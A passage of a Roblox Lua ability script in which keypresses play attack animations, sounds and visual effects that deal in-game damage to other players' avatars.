                        P.Size = Vector3.new(2,2,2)*(math.random(80,100)/100)
                        P.CFrame = ((CFrame.new(Pos,Pos+SurfaceNorm)*CFrame.Angles(math.rad(90),0,0))-Vector3.new(0,2.5,0))*CFrame.Angles(math.rad(math.random(-50,50)),math.rad(math.random(-50,50)),math.rad(math.random(-50,50)))
                        Parts[#Parts+1] = {P,P.CFrame,(CFrame.new(Pos,Pos+SurfaceNorm)*CFrame.Angles(math.rad(90),0,0))*CFrame.Angles(0,math.rad(i),0)*CFrame.new(0,0,-Radius-8)*CFrame.Angles(math.rad(math.random(-90,90)),math.rad(math.random(-90,90)),math.rad(math.random(-90,90))),P.Size}
                end
        end
        for i = 0,1,0.05 do
                for i2,v in pairs(Parts) do
                        v[1].CFrame = LerpCFrame(v[2],v[3],ApplyTrig(i,math.cos))
                end
                wait(0.02)
        end
        for i,v in pairs(Parts) do
                if v[1].Size.X > 2.1 then
                        v[1].CFrame = v[1].CFrame+Vector3.new(0,2,0)
                end
                v[1].Anchored = false
        end
        for i = 0,1,0.05 do
                for i2,v in pairs(Parts) do
                        v[1].Transparency = i
                        if i == 1 then
                                v[1]:Destroy()
                        elseif i >= 0.25 then
                                v[1].CanCollide = false
                        end
                end
                wait(0.02)
        end
        Parts = nil
        end)
end

----------------------------------------------------
mouse.KeyDown:connect(function(key)
    if key == "r" then
        larm.BrickColor = BrickColor.new("Bright red")
        rarm.BrickColor = BrickColor.new("Bright red")
        if Debounces.CanAttack == true then
        Debounces.CanAttack = false
        Debounces.on = true
        Debounces.NoIdl = true
to = char.Absolution.Thingy2.Touched:connect(function(ht)
        hit = ht.Parent
        if ht and hit:IsA("Model") then
                if hit:FindFirstChild("Humanoid") then
                    if hit.Name ~= p.Name then
                        --[[if Debounces.Slashing == true and Debounces.Slashed == false then
                                Debounces.Slashed = true]]--
                                    hit:FindFirstChild("Humanoid"):TakeDamage(10)
                                wait(1)
                                --Debounces.Slashed = false
                        --end
                    end
                end
        elseif ht and hit:IsA("Hat") then
            if hit.Parent.Name ~= p.Name then
                if hit.Parent:FindFirstChild("Humanoid") then
                       --[[ if Debounces.Slashing == true and Debounces.Slashed == false then
                                Debounces.Slashed = true]]--
                                hit.Parent:FindFirstChild("Humanoid"):TakeDamage(10)
                                wait(1)
                    --Debounces.Slashed = false
                end
            end
        end    
    end)
q = Instance.new("Sound",hed)
q.SoundId = "http://www.roblox.com/asset/?id=134012322"
q.Pitch = 0.85
q.Looped = false
q1 = Instance.new("Sound",hed)
q1.SoundId = "http://www.roblox.com/asset/?id=134012322"
q1.Pitch = 0.85
q1.Looped = false
q:Play()
q1:Play()
    for i = 1,20 do
        rarm.Weld.C0 = Lerp(rarm.Weld.C0, CFrame.new(2.3,1.1,-1) * CFrame.Angles(math.rad(115), math.rad(0), math.rad(-55)), 0.4)
        larm.Weld.C0 = Lerp(larm.Weld.C0, CFrame.new(-2.3,1.1,-1) * CFrame.Angles(math.rad(115), math.rad(0), math.rad(55)), 0.4)
        hed.Weld.C0 = Lerp(hed.Weld.C0, CFrame.new(0,3,0) * CFrame.Angles(math.rad(20), math.rad(0), math.rad(0)),0.4)
        torso.Weld.C0 = Lerp(torso.Weld.C0, CFrame.new(0, 4, 0) * CFrame.Angles(math.rad(30), math.rad(0), 0), 0.4)
        lleg.Weld.C0 = Lerp(lleg.Weld.C0, CFrame.new(-1, -3, 1) * CFrame.Angles(math.rad(-60), 0, math.rad(0)), 0.4)
        rleg.Weld.C0 = Lerp(rleg.Weld.C0, CFrame.new(1, -3, .6) * CFrame.Angles(math.rad(-60), 0, math.rad(0)), 0.4)
        cor.Weld.C0 = Lerp(cor.Weld.C0, CFrame.new(0, -2.2, -3) * CFrame.Angles(math.rad(-90), math.rad(-142), math.rad(0)), 0.5)
        if Debounces.on == false then break end
    wait()
end
n = Instance.new("Sound",hed)
n.SoundId = "http://www.roblox.com/asset/?id=168514932"
n.Pitch = 0.94
n.Looped = false
n1 = Instance.new("Sound",hed)
n1.SoundId = "http://www.roblox.com/asset/?id=168514932"
n1.Pitch = 0.94
n1.Looped = false
n:Play()
n1:Play()
b = Instance.new("Sound",hed)
b.SoundId = "http://www.roblox.com/asset/?id=168586586"
b.Pitch = 0.94
b.Looped = false
b1 = Instance.new("Sound",hed)
b1.SoundId = "http://www.roblox.com/asset/?id=168586586"
b1.Pitch = 0.94
b1.Looped = false
b:Play()
b1:Play()
    for i = 1,26 do
        rarm.Weld.C0 = Lerp(rarm.Weld.C0, CFrame.new(2.3,1.1,-1) * CFrame.Angles(math.rad(50), math.rad(0), math.rad(-55)), 0.5)
        larm.Weld.C0 = Lerp(larm.Weld.C0, CFrame.new(-2.3,1.1,-1) * CFrame.Angles(math.rad(50), math.rad(0), math.rad(55)), 0.5)
        hed.Weld.C0 = Lerp(hed.Weld.C0, CFrame.new(0,3,0) * CFrame.Angles(math.rad(-10), math.rad(0), math.rad(0)),0.5)
        torso.Weld.C0 = Lerp(torso.Weld.C0, CFrame.new(0, -1.1, 0) * CFrame.Angles(math.rad(-40), math.rad(0), 0), 0.5)
        lleg.Weld.C0 = Lerp(lleg.Weld.C0, CFrame.new(-1, -3, -1) * CFrame.Angles(math.rad(50), 0, math.rad(0)), 0.5)
        rleg.Weld.C0 = Lerp(rleg.Weld.C0, CFrame.new(1, -3, .4) * CFrame.Angles(math.rad(-10), 0, math.rad(0)), 0.5)
        cor.Weld.C0 = Lerp(cor.Weld.C0, CFrame.new(1.4, -3.5, -7) * CFrame.Angles(math.rad(-90), math.rad(-142), math.rad(20)), 0.5)
        if Debounces.on == false then break end
    wait()
end
wait(.5)
to:disconnect()
q:Destroy()
q1:Destroy()
n:Destroy()
n1:Destroy()
larm.BrickColor = BrickColor.new("Institutional white")
rarm.BrickColor = BrickColor.new("Institutional white")
    if Debounces.CanAttack == false then
        Debounces.CanAttack = true
        Debounces.on = false
        Debounces.NoIdl = false
            end
        end
    end
end)
----------------------------------------------------
mouse.KeyDown:connect(function(key)
    if key == "q" then
        larm.BrickColor = BrickColor.new("Bright red")
        rarm.BrickColor = BrickColor.new("Bright red")
        if Debounces.CanAttack == true then
        Debounces.CanAttack = false
        Debounces.on = true
        Debounces.NoIdl = true
to = char.Absolution.Thingy2.Touched:connect(function(ht)
        hit = ht.Parent
        if ht and hit:IsA("Model") then
                if hit:FindFirstChild("Humanoid") then
                    if hit.Name ~= p.Name then
                        --[[if Debounces.Slashing == true and Debounces.Slashed == false then
                                Debounces.Slashed = true]]--
                                    hit:FindFirstChild("Humanoid"):TakeDamage(4)
                                wait(1)
                                --Debounces.Slashed = false
                        --end
                    end
                end
        elseif ht and hit:IsA("Hat") then
            if hit.Parent.Name ~= p.Name then
                if hit.Parent:FindFirstChild("Humanoid") then
                       --[[ if Debounces.Slashing == true and Debounces.Slashed == false then
                                Debounces.Slashed = true]]--
                                hit.Parent:FindFirstChild("Humanoid"):TakeDamage(4)
                                wait(1)
                    --Debounces.Slashed = false
                end
            end
        end    
    end)
        for i = 1, 20 do
            rarm.Weld.C0 = Lerp(rarm.Weld.C0, CFrame.new(3,.9,0) * CFrame.Angles(math.rad(21), math.rad(75), math.rad(50)), 0.2)
            larm.Weld.C0 = Lerp(larm.Weld.C0, CFrame.new(-3,.9,0) * CFrame.Angles(math.rad(-30), math.rad(0), math.rad(-18)), 0.2)
            hed.Weld.C0 = Lerp(hed.Weld.C0, CFrame.new(0,3,-.2) * CFrame.Angles(math.rad(-14),math.rad(-60),0), 0.5)
            torso.Weld.C0 = Lerp(torso.Weld.C0, CFrame.new(0, -1.2, 0) * CFrame.Angles(0, math.rad(70), 0), 0.5)
            lleg.Weld.C0 = Lerp(lleg.Weld.C0, CFrame.new(-1.2, -3, 0) * CFrame.Angles(0, 0, math.rad(-10)), 0.5)
            rleg.Weld.C0 = Lerp(rleg.Weld.C0, CFrame.new(1.2, -3, 0) * CFrame.Angles(0, 0, math.rad(10)), 0.5)
            cor.Weld.C0 = Lerp(cor.Weld.C0, CFrame.new(0, -1.7, -1.4) * CFrame.Angles(math.rad(-90), math.rad(-90), math.rad(0)), 1)
        if Debounces.on == false then break end
        wait()
    end
    z = Instance.new("Sound",hed)
    z.SoundId = "rbxassetid://160069154"
    z.Looped = false
    z.Pitch = .9
    z1 = Instance.new("Sound",hed)
    z1.SoundId = "rbxassetid://160069154"
    z1.Looped = false
    z1.Pitch = .9
    wait(0.01)
    z:Play()
    z1:Play()
        for i = 1, 12 do
            rarm.Weld.C0 = Lerp(rarm.Weld.C0, CFrame.new(3,.9,0) * CFrame.Angles(math.rad(0), math.rad(0), math.rad(50)), 0.2)
            larm.Weld.C0 = Lerp(larm.Weld.C0, CFrame.new(-2,.9,-1) * CFrame.Angles(math.rad(60), math.rad(0), math.rad(20)), 0.5)
            hed.Weld.C0 = Lerp(hed.Weld.C0, CFrame.new(0,3,-.2) * CFrame.Angles(math.rad(-14),math.rad(30),0), 0.5)
            torso.Weld.C0 = Lerp(torso.Weld.C0, CFrame.new(0, -3, 0) * CFrame.Angles(math.rad(0), math.rad(-30), math.rad(0)), 0.5)
            lleg.Weld.C0 = Lerp(lleg.Weld.C0, CFrame.new(-1, -1, -2) * CFrame.Angles(math.rad(-10), 0, 0), 0.5)
            rleg.Weld.C0 = Lerp(rleg.Weld.C0, CFrame.new(1, -2.8, .6) * CFrame.Angles(math.rad(-65), 0, 0), 0.5)
            cor.Weld.C0 = Lerp(cor.Weld.C0, CFrame.new(0, -1.7, -1.4) * CFrame.Angles(math.rad(-90), math.rad(-90), math.rad(0)), 1)
        if Debounces.on == false then break end
        wait()
    end
        for i = 1, 12 do
            rarm.Weld.C0 = Lerp(rarm.Weld.C0, CFrame.new(3,.9,0) * CFrame.Angles(math.rad(140), math.rad(0), math.rad(50)), 0.4)
            larm.Weld.C0 = Lerp(larm.Weld.C0, CFrame.new(-3,.9,0) * CFrame.Angles(math.rad(0), math.rad(0), math.rad(-18)), 0.4)
            hed.Weld.C0 = Lerp(hed.Weld.C0, CFrame.new(0,3,-.2) * CFrame.Angles(math.rad(-14),math.rad(10),0), 0.5)
            torso.Weld.C0 = Lerp(torso.Weld.C0, CFrame.new(0, -1.2, 0) * CFrame.Angles(0, math.rad(-10), 0), 0.5)
            lleg.Weld.C0 = Lerp(lleg.Weld.C0, CFrame.new(-1.2, -3, 0) * CFrame.Angles(0, 0, math.rad(-10)), 0.5)
            rleg.Weld.C0 = Lerp(rleg.Weld.C0, CFrame.new(1.2, -3, 0) * CFrame.Angles(0, 0, math.rad(10)), 0.5)
            cor.Weld.C0 = Lerp(cor.Weld.C0, CFrame.new(0, -1.7, -1.4) * CFrame.Angles(math.rad(-90), math.rad(-90), math.rad(0)), 1)
        if Debounces.on == false then break end
        wait()
    end
    z = Instance.new("Sound",hed)
    z.SoundId = "rbxassetid://168586621"
    z.Looped = false
    z.Pitch = 1
    z1 = Instance.new("Sound",hed)
    z1.SoundId = "rbxassetid://168586621"
    z1.Looped = false
    z1.Pitch = 1
    wait(0.01)
    z:Play()
    z1:Play()
        for i = 1, 12 do
            rarm.Weld.C0 = Lerp(rarm.Weld.C0, CFrame.new(3,.9,0) * CFrame.Angles(math.rad(40), math.rad(-20), math.rad(10)), 0.5)
            larm.Weld.C0 = Lerp(larm.Weld.C0, CFrame.new(-3,.9,0) * CFrame.Angles(math.rad(-20), math.rad(0), math.rad(-18)), 0.4)
            hed.Weld.C0 = Lerp(hed.Weld.C0, CFrame.new(0,3,-.2) * CFrame.Angles(math.rad(-14),math.rad(-40),0), 0.5)
            torso.Weld.C0 = Lerp(torso.Weld.C0, CFrame.new(0, -1.2, 0) * CFrame.Angles(0, math.rad(40), 0), 0.5)
            lleg.Weld.C0 = Lerp(lleg.Weld.C0, CFrame.new(-1.2, -3, 0) * CFrame.Angles(math.rad(-20), 0, math.rad(-10)), 0.5)
            rleg.Weld.C0 = Lerp(rleg.Weld.C0, CFrame.new(1.2, -3, 0) * CFrame.Angles(math.rad(20), 0, math.rad(10)), 0.5)
            cor.Weld.C0 = Lerp(cor.Weld.C0, CFrame.new(0, -2.8, -1.4) * CFrame.Angles(math.rad(-110), math.rad(-90), math.rad(20)), 1)
        if Debounces.on == false then break end
        wait()
    end
to:disconnect()
larm.BrickColor = BrickColor.new("Institutional white")
rarm.BrickColor = BrickColor.new("Institutional white")
    if Debounces.CanAttack == false then
        Debounces.CanAttack = true
        Debounces.on = false
        Debounces.NoIdl = false
            end
        end
    end
end)
----------------------------------------------------
Sit = false
mouse.KeyDown:connect(function(key)
    if key == "v" then
        if Sit == false then
            Sit = true
            hum.WalkSpeed = 0.001
        stanceToggle = "Sitting"
    elseif Sit == true then
        Sit = false
            hum.WalkSpeed = 7
        stanceToggle = "Normal"
        end
    end
end)
----------------------------------------------------
mouse.KeyDown:connect(function(key)
    if key == "t" then
        if Debounces.CanAttack == true then
        Debounces.CanAttack = false
        Debounces.on = true
        Debounces.NoIdl = true
        for i = 1, 20 do
        rarm.Weld.C0 = Lerp(rarm.Weld.C0, CFrame.new(2.3,1.1,-1) *  CFrame.Angles(math.rad(115), math.rad(0), math.rad(-55)), 0.4)
        larm.Weld.C0 = Lerp(larm.Weld.C0, CFrame.new(-2.3,1.1,-1) *  CFrame.Angles(math.rad(115), math.rad(0), math.rad(55)), 0.4)
        hed.Weld.C0 = Lerp(hed.Weld.C0, CFrame.new(0,3,0) * CFrame.Angles(math.rad(20), math.rad(0), math.rad(0)),0.4)
        torso.Weld.C0 = Lerp(torso.Weld.C0, CFrame.new(0, -1, 0) * CFrame.Angles(math.rad(30), math.rad(0), 0), 0.4)
        lleg.Weld.C0 = Lerp(lleg.Weld.C0, CFrame.new(-1, -3, .6) * CFrame.Angles(math.rad(-30), 0, math.rad(0)), 0.4)
        rleg.Weld.C0 = Lerp(rleg.Weld.C0, CFrame.new(1, -2, -1.2) * CFrame.Angles(math.rad(0), 0, math.rad(0)), 0.4)
        cor.Weld.C0 = Lerp(cor.Weld.C0, CFrame.new(1.4, -3.5, -7) * CFrame.Angles(math.rad(-90), math.rad(-142), math.rad(20)), 1)
            if Debounces.on == false then break end
            wait()
        end
        Spawn(function()
            local Parts = {}
            for Y = -5,5 do
                local P = Instance.new("Part",char)
                P.Anchored = true
                P.FormFactor = "Custom"
                P.CanCollide = false
                P.Size = Vector3.new(1,2,1)
                P.TopSurface = "SmoothNoOutlines"
                P.BottomSurface = "SmoothNoOutlines"
                P.BrickColor = BrickColor.new("Institutional white")
                P.Name = tostring(Y)
                local i = (Y+5)/(10)
                i = 1-math.cos(math.pi*i-(math.pi/2))
                P.CFrame = char.HumanoidRootPart.CFrame*CFrame.new(0,Y,-15+(i*1.5))*CFrame.Angles(math.rad(Y*5),0,0)
                --[[P.Touched:connect(function(ht)
                    local hit = ht.Parent
                    if hit:FindFirstChild("Humanoid") then
                        hit.Humanoid:TakeDamage(math.random(20,50))
                    end
                end)]]--
        s = Instance.new("Sound",P)
        s.SoundId = "rbxassetid://228343271"
        s.Volume = .7
        s.Pitch = 0.9
        s:Play()
P.Touched:connect(function(ht)
        hit = ht.Parent
        if ht and hit:IsA("Model") then
                if hit:FindFirstChild("Humanoid") then
                    if hit.Name ~= p.Name then
                        --[[if Debounces.Slashing == true and Debounces.Slashed == false then
                                Debounces.Slashed = true]]--
                                    hit:FindFirstChild("Humanoid"):TakeDamage(math.random(1,3))
                                    hit:FindFirstChild("Humanoid").PlatformStand = true
                                wait(1)
                                --Debounces.Slashed = false
                        --end
                end
                end
        elseif ht and hit:IsA("Hat") then
            if hit.Parent.Name ~= p.Name then
                if hit.Parent:FindFirstChild("Humanoid") then
                        --[[if Debounces.Slashing == true and Debounces.Slashed == false then
                                Debounces.Slashed = true]]--
                                hit.Parent:FindFirstChild("Humanoid"):TakeDamage(math.random (1,3))
                                hit:FindFirstChild("Humanoid").PlatformStand = true
                                wait(1)
                    --Debounces.Slashed = false
                --end
            end
        end
    end
end)
                Parts[#Parts+1] = P
            end
            local BREAKIT = false
            local CParts = {}
            local Rocks = {}
            local LastPos = nil
            for i = 1,70 do
                for i2,v in pairs(Parts) do
                    v.CFrame = v.CFrame*CFrame.new(0,0,-4)
                    local cf = v.CFrame
                    v.Size = v.Size+Vector3.new(0.4,0.35,0)
                    v.CFrame = cf
                    v.Transparency = v.Transparency+0.02
                    if v.Transparency >= 0.975 then BREAKIT = true end
                    if v.Name == "0" then
                        local Ignore = {}
                        for i,v in pairs(game:GetService("Players"):GetPlayers()) do
                            if v.Character ~= nil then
                                Ignore[#Ignore+1] = v.Character
                            end
                        end
                        local ray = Ray.new(v.Position+Vector3.new(0,20,0),Vector3.new(0,-200,0))
                        local Hit,Pos,SurfaceNorm = Workspace:FindPartOnRayWithIgnoreList(ray,Ignore)
                        if Hit ~= nil then
                            if #Rocks == 0 then
                                for i = 1,5 do
                                    local P = Instance.new("Part",char)
                                    Rocks[#Rocks+1] = P
                                    P.Anchored = true
                                    P.FormFactor = "Custom"
                                    P.BrickColor = Hit.BrickColor
                                    P.Material = Hit.Material
                                    P.TopSurface = "Smooth"
                                    P.BottomSurface = "Smooth"
                                    P.Size = Vector3.new(1,1,1)*(math.random(500,900)/100)
                                end
                            end
                            for i,P in pairs(Rocks) do
                                P.CFrame = ((CFrame.new(Pos)*(v.CFrame-v.Position))*CFrame.new(math.random(-math.ceil(v.Size.X/2),math.ceil(v.Size.X/2)),0,-math.random(5,8))-Vector3.new(0,0.25,0))*CFrame.Angles(math.rad(math.random(-50,50)),math.rad(math.random(-50,50)),math.rad(math.random(20,50)))
                            end
                            local P = Instance.new("Part",char)
                            CParts[#CParts+1] = {P,tick()}
                            P.Anchored = true
                            P.FormFactor = "Custom"
                            P.BrickColor = Hit.BrickColor
                            P.Material = Hit.Material
                            P.TopSurface = "Smooth"
                            P.BottomSurface = "Smooth"
                            P.Size = Vector3.new(1,1,1)*(math.random(100,300)/100)
                            Pos = CFrame.new(Pos)*(v.CFrame-v.Position)*CFrame.new(v.Size.X/2,0,0)
                            Pos = Pos.p
                            P.CFrame = ((CFrame.new(Pos,Pos+SurfaceNorm)*CFrame.Angles(math.rad(90),0,0))-Vector3.new(0,0.25,0))*CFrame.Angles(math.rad(math.random(-50,50)),math.rad(math.random(-50,50)),math.rad(math.random(20,50)))
                            local P = P:Clone()
                            CParts[#CParts+1] = {P,tick()}
                            P.Parent = char
                            Pos = CFrame.new(Pos)*(v.CFrame-v.Position)*CFrame.new(-v.Size.X,0,0)
                            Pos = Pos.p
                            P.CFrame = ((CFrame.new(Pos,Pos+SurfaceNorm)*CFrame.Angles(math.rad(90),0,0))-Vector3.new(0,0.25,0))*CFrame.Angles(math.rad(math.random(-50,50)),math.rad(math.random(-50,50)),math.rad(math.random(-50,-20)))
                            if LastPos ~= nil then
                                local P = P:Clone()
                                CParts[#CParts+1] = {P,tick()}
                                P.Parent = char
                                P.BrickColor = BrickColor.new("Institutional white")
                                Pos = CFrame.new(Pos)*(v.CFrame-v.Position)*CFrame.new(v.Size.X/2,0,0)
                                Pos = Pos.p
                                local CFr = (CFrame.new(Pos)*(v.CFrame-v.Position))-Vector3.new(0,0.4,0)
                                P.Size = Vector3.new(v.Size.X-0.25,1,(CFr.p-LastPos.p).Magnitude+0.25)
                                --P.Velocity = Vector3.new(0,-1000,0)
                                P.CFrame = CFrame.new(CFr.p,LastPos.p)*CFrame.new(0,0,-((CFr.p-LastPos.p).Magnitude+0.25)/2)
                            end
                            LastPos = (CFrame.new(Pos)*(v.CFrame-v.Position))-Vector3.new(0,0.4,0)
                        end
                    end
                end
                if BREAKIT then break end
                wait(0.002)
            end
            for i,v in pairs(Rocks) do
                CParts[#CParts+1] = {v,tick()}
            end
            for i,v in pairs(Parts) do
                v:Destroy()
            end
            Parts = nil
            while true do
                local t = tick()
                local p = nil
                for i,v in pairs(CParts) do
                    if t-v[2] > 4 then
                        v[1].Transparency = v[1].Transparency+0.05
                        if v[1].Transparency >= 1 then
                            v[1]:Destroy()
                            CParts[i] = nil
                        end
                    end
                    p = v
                end
                if p == nil then break end
                wait(0.002)
            end
            for i,v in pairs(CParts) do
                v:Destroy()
            end
            CParts = {}
        end)
        for i = 1, 20 do
        rarm.Weld.C0 = Lerp(rarm.Weld.C0, CFrame.new(2.3,.8,-1) *   CFrame.Angles(math.rad(50), math.rad(0), math.rad(-55)), 0.4)
        larm.Weld.C0 = Lerp(larm.Weld.C0, CFrame.new(-2.3,.8,-1) *   CFrame.Angles(math.rad(50), math.rad(0), math.rad(55)), 0.4)
        hed.Weld.C0 = Lerp(hed.Weld.C0, CFrame.new(0,3,0) * CFrame.Angles(math.rad(-20), math.rad(0), math.rad(0)),0.4)
        torso.Weld.C0 = Lerp(torso.Weld.C0, CFrame.new(0, -2.6, 0) * CFrame.Angles(math.rad(-30), math.rad(0), 0), 0.4)
        lleg.Weld.C0 = Lerp(lleg.Weld.C0, CFrame.new(-1, -1, -1.4) * CFrame.Angles(math.rad(40), 0, math.rad(0)), 0.4)
        rleg.Weld.C0 = Lerp(rleg.Weld.C0, CFrame.new(1, -1.6, -.9) * CFrame.Angles(math.rad(10), 0, math.rad(0)), 0.4)
        cor.Weld.C0 = Lerp(cor.Weld.C0, CFrame.new(1.4, -3.5, -7) * CFrame.Angles(math.rad(-90), math.rad(-142), math.rad(20)), 1)
            if Debounces.on == false then break end
            wait()
        end
    if Debounces.CanAttack == false then
        Debounces.CanAttack = true
        Debounces.on = false
        Debounces.NoIdl = false
            end
        end
    end
end)
----------------------------------------------------
mouse.KeyDown:connect(function(key)
    if key == "e" then
    larm.BrickColor = BrickColor.new("Bright red")
    rarm.BrickColor = BrickColor.new("Bright red")
        if Debounces.CanAttack == true then
        Debounces.CanAttack = false
        Debounces.on = true
        Debounces.NoIdl = true
        for i = 1, 18 do
            rarm.Weld.C0 = Lerp(rarm.Weld.C0, CFrame.new(3, 1.7, 0) * CFrame.Angles(math.rad(90),math.rad(50),math.rad(90)), 0.4)
            larm.Weld.C0 = Lerp(larm.Weld.C0, CFrame.new(-3, 0.9, 0) * CFrame.Angles(math.rad(0),math.rad(0),math.rad(-20)), 0.4)
            hed.Weld.C0 = Lerp(hed.Weld.C0, CFrame.new(0, 3, 0) * CFrame.Angles(math.rad(-14),math.rad(0),0), 0.4)
            torso.Weld.C0 = Lerp(torso.Weld.C0, CFrame.new(0, -1.2, 0) * CFrame.Angles(0, math.rad(0), 0), 0.4)
            lleg.Weld.C0 = Lerp(lleg.Weld.C0, CFrame.new(-1, -3, 0) * CFrame.Angles(0, 0, math.rad(-10)), 0.4)
            rleg.Weld.C0 = Lerp(rleg.Weld.C0, CFrame.new(1, -3, 0) * CFrame.Angles(0, 0, math.rad(10)), 0.4)
            cor.Weld.C0 = Lerp(cor.Weld.C0, CFrame.new(0, -1.5, -.9) * CFrame.Angles(math.rad(-90), math.rad(-90), math.rad(0)), 1)
        if Debounces.on == false then break end
            wait()
        end
        local HandCF = CFrame.new(char.Absolution.Handle.Position - Vector3.new(0,8.8,0)) * CFrame.Angles(math.rad(90), math.rad(0), math.rad(0))
        local rng = Instance.new("Part", char.Absolution.Handle)
        rng.Anchored = true
        rng.BrickColor = BrickColor.new("Institutional white")
        rng.CanCollide = true
        rng.FormFactor = 3
        rng.Name = "Ring"
        rng.Size = Vector3.new(1, 1, 1)
        rng.CanCollide = false
        rng.Transparency = 0.35
        rng.TopSurface = 0
        rng.BottomSurface = 0
        rng.CFrame = HandCF
        local rngm = Instance.new("SpecialMesh", rng)
        rngm.MeshId = "http://www.roblox.com/asset/?id=3270017"
        rngm.Scale = Vector3.new(1, 1, 2)
            x = Instance.new("Sound", hed)
            x.SoundId = "http://www.roblox.com/asset/?id=169445602"
            x.Looped = false
            x.Pitch = .7
            x.Volume = 1
            x1 = Instance.new("Sound", hed)
            x1.SoundId = "http://www.roblox.com/asset/?id=169445602"
            x1.Looped = false
            x1.Pitch = .7
            x1.Volume = 1
            x:Play()
            x1:Play()
            rngto = rng.Touched:connect(function(ht)
            hit = ht.Parent
            if ht and hit:IsA("Model") then
                    if hit:FindFirstChild("Humanoid") then
                        if hit.Name ~= p.Name then
                            --[[if Debounces.Slashing == true and Debounces.Slashed == false then
                                    Debounces.Slashed = true]]--
                                    hit:FindFirstChild("Humanoid"):TakeDamage(4)
                                    hit:FindFirstChild("Humanoid").PlatformStand = true
                                    hit:FindFirstChild("Torso").Velocity = hit:FindFirstChild("Torso").CFrame.lookVector * -120
                                    --Debounces.Slashed = false
                            --end
                        end
                    end
            elseif ht and hit:IsA("Hat") then
                if hit.Parent.Name ~= p.Name then
                    if hit.Parent:FindFirstChild("Humanoid") then
                           --[[ if Debounces.Slashing == true and Debounces.Slashed == false then
                                    Debounces.Slashed = true]]--
                                    hit.Parent:FindFirstChild("Humanoid"):TakeDamage(4)
                                    hit:FindFirstChild("Humanoid").PlatformStand = true
                                    hit:FindFirstChild("Torso").Velocity = hit:FindFirstChild("Torso").CFrame.lookVector * -120
                        --Debounces.Slashed = false
                    end
                end
            end    
        end)
                coroutine.wrap(function()
                for i = 1, 60, 2 do
                rngm.Scale = Vector3.new(2 + i*2, 2 + i*2, 1)
                rng.Size = rngm.Scale
                rng.CFrame = HandCF
                rng.Transparency = i/60
                wait()
                end
                wait()
                rng:Destroy()
                end)()
        for i = 1, 18 do
            rarm.Weld.C0 = Lerp(rarm.Weld.C0, CFrame.new(3, 0.9, 0) * CFrame.Angles(math.rad(90),math.rad(0),math.rad(90)), 0.4)
            larm.Weld.C0 = Lerp(larm.Weld.C0, CFrame.new(-3, 0.9, 0) * CFrame.Angles(math.rad(0),math.rad(0),math.rad(-20)), 0.4)
            hed.Weld.C0 = Lerp(hed.Weld.C0, CFrame.new(0, 3, 0) * CFrame.Angles(math.rad(-14),math.rad(0),0), 0.4)
            torso.Weld.C0 = Lerp(torso.Weld.C0, CFrame.new(0, -1.2, 0) * CFrame.Angles(0, math.rad(0), 0), 0.4)
            lleg.Weld.C0 = Lerp(lleg.Weld.C0, CFrame.new(-1, -3, 0) * CFrame.Angles(0, 0, math.rad(-10)), 0.4)
            rleg.Weld.C0 = Lerp(rleg.Weld.C0, CFrame.new(1, -3, 0) * CFrame.Angles(0, 0, math.rad(10)), 0.4)
            cor.Weld.C0 = Lerp(cor.Weld.C0, CFrame.new(0, -1.5, 0.2) * CFrame.Angles(math.rad(-90), math.rad(-90), math.rad(0)), 1)
        if Debounces.on == false then break end
            wait()
        end
        larm.BrickColor = BrickColor.new("Institutional white")
        rarm.BrickColor = BrickColor.new("Institutional white")
        x:Destroy()
        x1:Destroy()
    if Debounces.CanAttack == false then
        Debounces.CanAttack = true
        Debounces.on = false
        Debounces.NoIdl = false
            end
        end
    end
end)
----------------------------------------------------
mouse.KeyDown:connect(function(key)
	if key == "y" then
		if Debounces.CanAttack == true then
            Debounces.CanAttack = false
            Debounces.on = true
            Debounces.NoIdl = true
				for i = 1, 15 do
					rarm.Weld.C0 = Lerp(rarm.Weld.C0, CFrame.new(3,.9,0)*CFrame.Angles(math.rad(90),math.rad(0),math.rad(30)), 0.2)
					larm.Weld.C0 = Lerp(larm.Weld.C0, CFrame.new(-3,.9,0)*CFrame.Angles(math.rad(0),math.rad(0),math.rad(-90)), 0.2)
					hed.Weld.C0 = Lerp(hed.Weld.C0, CFrame.new(0,3,-.2)*CFrame.Angles(math.rad(-14),math.rad(90),0), 0.2)
					torso.Weld.C0 = Lerp(torso.Weld.C0, CFrame.new(0, -1.2, 0) * CFrame.Angles(0, math.rad(-90), 0), 0.2)
					lleg.Weld.C0 = Lerp(lleg.Weld.C0, CFrame.new(-1.2, -3, 0) * CFrame.Angles(0, 0, math.rad(-10)), 0.2)
					rleg.Weld.C0 = Lerp(rleg.Weld.C0, CFrame.new(1.2, -3, 0) * CFrame.Angles(0, 0, math.rad(10)), 0.2)
					cor.Weld.C0 = Lerp(cor.Weld.C0, CFrame.new(0, -1, -1.1) * CFrame.Angles(math.rad(-90), math.rad(-110), math.rad(-70)), 1)
                    if Debounces.on == false then break end
                    wait()
                end
				x = Instance.new("Sound",char)
				x.SoundId = "rbxassetid://228343271"
				x.Pitch = 1
				x.Volume = .8
				wait(.1)
				x:Play()
				Debounces.on = false
				Debounces.Here = false
				shot = shot + 1
local rng = Instance.new("Part", char)
rng.Anchored = true
rng.BrickColor = BrickColor.new("Institutional white")
rng.CanCollide = false
rng.FormFactor = 3
rng.Name = "Ring"
rng.Size = Vector3.new(1, 1, 1)
rng.Transparency = 0.35
rng.TopSurface = 0
rng.BottomSurface = 0
rng2 = rng:clone()
rng3 = rng2:clone()
rng4 = rng2:clone()
local rngm = Instance.new("SpecialMesh", rng)
rngm.MeshId = "http://www.roblox.com/asset/?id=3270017"
rngm.Scale = Vector3.new(10, 10, 1)
rngm2 = rngm:clone()
rngm2.Scale = Vector3.new(5, 5, 1)
rngm3=rngm2:clone()
rngm3.Parent = rng3
rngm3.Scale = Vector3.new(8, 8, 1)
rngm4 = rngm2:clone()
rngm4.Parent = rng4
rngm4.Scale = Vector3.new(6, 6, 1)
local bem = Instance.new("Part", char)
bem.Anchored = true
bem.BrickColor = BrickColor.new("Institutional white")
bem.CanCollide = false
bem.FormFactor = 3
bem.Name = "Beam" .. shot
bem.Size = Vector3.new(1, 1, 1)
bem.Transparency = 0.35
bem.TopSurface = 0
bem.BottomSurface = 0
local bemm = Instance.new("SpecialMesh", bem)
bemm.MeshType = 4
bemm.Scale = Vector3.new(1, 4, 4)
local out = Instance.new("Part", char)
out.Anchored = true
out.BrickColor = BrickColor.new("Institutional white")
out.CanCollide = false
out.FormFactor = 3
out.Name = "Out"
out.Size = Vector3.new(4, 4, 4)
out.Transparency = 0.35
out.TopSurface = 0
out.BottomSurface = 0
local outm = Instance.new("SpecialMesh", out)
